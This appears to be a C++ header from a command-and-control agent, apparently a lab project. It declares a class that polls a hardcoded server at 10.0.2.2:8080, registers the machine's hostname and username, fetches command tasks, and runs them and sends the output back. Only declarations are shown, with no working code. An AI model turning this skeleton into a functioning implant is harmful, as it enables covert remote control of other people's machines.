#include <chrono>
#include <cpr/cpr.h>
#include <string>

using namespace std::chrono_literals;

class Agent {
public:
  explicit Agent(uint64_t agentId, std::string publicKey)
      : agentId_{agentId}, publicKey_{publicKey} {}
  explicit Agent();
  void mainLoop();

private:
  static constexpr auto sleepTime_ = 10s;
  const std::string host_ = "http://10.0.2.2:8080";
  uint64_t agentId_;
  std::string publicKey_;

  struct RegisterInfo {
    std::string hostname;
    std::string username;
  };

  struct Task {
    uint64_t taskId;
    std::string command;
  };

  struct Result {
    std::string output;
  };

private:
  std::vector<Task> getTasks();
  void executeAndSendResults(const std::vector<Task> &tasks);
  cpr::Url endpointUrl(const std::string &endpoint);
};
